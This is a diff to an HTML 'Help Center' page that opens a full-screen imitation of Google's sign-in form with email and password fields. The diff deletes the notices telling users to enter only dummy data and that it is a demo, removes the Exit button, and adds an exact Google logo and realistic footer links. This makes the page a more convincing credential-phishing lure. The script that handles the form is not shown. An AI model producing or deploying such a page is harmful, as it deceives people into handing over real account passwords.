@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <title>Help Center - Account Settings</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <link rel="stylesheet" href="./styles.css" />
+  <script type="module" src="./src/main.ts"></script>
 </head>
 
   <body>
@@ -46,10 +46,6 @@
               If you are having trouble signing in, we can re-check your
               connected Google account.
             </p>
-            <p class="help-note">
-              You will see a Google style sign-in screen to confirm your
-              account. Use only demo or dummy information.
-            </p>
             <div class="help-popup-actions">
               <button id="help-cancel" class="ghost-btn">Cancel</button>
               <button id="help-continue" class="primary-btn">
@@ -65,67 +61,98 @@
     <div id="fake-google-root" class="fake-root hidden">
       <div class="fake-bg">
         <div class="fake-card">
-          <div class="fake-logo-circle">G</div>
+          <div class="fake-layout">
+            <div class="fake-info">
+              <div class="fake-logo-circle" aria-hidden="true">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="48"
+                  height="48"
+                  viewBox="0 0 48 48"
+                  role="img"
+                  aria-labelledby="fake-google-logo"
+                >
+                  <title id="fake-google-logo">Google logo</title>
+                  <path
+                    fill="#4285f4"
+                    d="M43.6 20.5H24v7h11.3c-.5 3-2.1 5.3-4.4 6.9v5.7h7.1C41.5 35.6 44 30 44 24c0-1.2-.1-2.4-.4-3.5z"
+                  />
+                  <path
+                    fill="#34a853"
+                    d="M24 44c6 0 11-2 14.7-5.5l-7.1-5.7c-2 1.4-4.6 2.2-7.6 2.2-5.8 0-10.7-3.9-12.4-9.2H4.2v5.8C7.9 39.3 15.3 44 24 44z"
+                  />
+                  <path
+                    fill="#fbbc05"
+                    d="M11.6 26.3c-.4-1.2-.6-2.5-.6-3.8s.2-2.6.6-3.8v-5.8H4.2C2.8 14.8 2 19.3 2 22.5s.8 7.7 2.2 11.2l7.4-5.8z"
+                  />
+                  <path
+                    fill="#ea4335"
+                    d="M24 9.5c3.2 0 6 1.1 8.3 3.2l6.2-6.2C35 2.7 29.9 1 24 1 15.3 1 7.9 5.7 4.2 14.2l7.4 5.8C13.3 13.4 18.2 9.5 24 9.5z"
+                  />
+                </svg>
+              </div>
 
-          <h1 class="fake-title">Sign in</h1>
-          <p class="fake-subtitle">Use your Google Account</p>
-
-          <form id="fake-login-form" class="fake-form">
-            <label class="fake-label">
-              <input
-                id="fake-email"
-                type="email"
-                class="fake-input"
-                placeholder="Email or phone"
-                autocomplete="off"
-              />
-            </label>
-
-            <button type="button" class="fake-link-btn" id="fake-forgot">
-              Forgot email
-            </button>
-
-            <div class="divider-space"></div>
-
-            <label class="fake-label">
-              <input
-                id="fake-password"
-                type="password"
-                class="fake-input"
-                placeholder="Enter your password"
-                autocomplete="off"
-              />
-            </label>
-
-            <div class="fake-form-footer">
-              <button type="button" class="fake-link-btn">
-                Learn more
-              </button>
-              <button type="submit" class="primary-btn fake-submit">
-                Next
-              </button>
+              <h1 class="fake-title">Sign in</h1>
+              <p class="fake-subtitle">Use your Google Account</p>
             </div>
-          </form>
 
-          <div class="fake-footer-links">
-            <button type="button" class="fake-link-btn">Create account</button>
-            <span class="dot-separator"></span>
-            <button
-              type="button"
-              id="exit-fullscreen"
-              class="fake-link-btn dangerous-link"
-            >
-              Exit
-            </button>
+            <div class="fake-form-wrapper">
+              <form id="fake-login-form" class="fake-form">
+                <label class="fake-label">
+                  <input
+                    id="fake-email"
+                    type="email"
+                    class="fake-input"
+                    placeholder="Email or phone"
+                    autocomplete="off"
+                  />
+                </label>
+
+                <button type="button" class="fake-link-btn" id="fake-forgot">
+                  Forgot email?
+                </button>
+
+                <label class="fake-label">
+                  <input
+                    id="fake-password"
+                    type="password"
+                    class="fake-input"
+                    placeholder="Enter your password"
+                    autocomplete="off"
+                  />
+                </label>
+
+                <p class="fake-info-note">
+                  Not your computer? Use Guest mode
+                  <button type="button" class="fake-link-btn fake-inline-link">
+                    Learn more
+                  </button>
+                </p>
+
+                <div class="fake-form-footer">
+                  <button type="button" class="fake-link-btn">
+                    Create account
+                  </button>
+                  <button type="submit" class="primary-btn fake-submit">
+                    Next
+                  </button>
+                </div>
+              </form>
+            </div>
           </div>
 
-          <p class="fake-disclaimer">
-            Demo only. Do not enter real credentials. No data is stored.
-          </p>
+          <div class="fake-bottom-bar">
+            <button type="button" class="fake-link-btn language-btn">
+              English (United States)
+            </button>
+            <div class="fake-bottom-links">
+              <button type="button" class="fake-link-btn">Help</button>
+              <button type="button" class="fake-link-btn">Privacy</button>
+              <button type="button" class="fake-link-btn">Terms</button>
+            </div>
+          </div>
         </div>
       </div>
     </div>
-
-    <script type="module" src="./src/main.ts"></script>
   </body>
 </html>
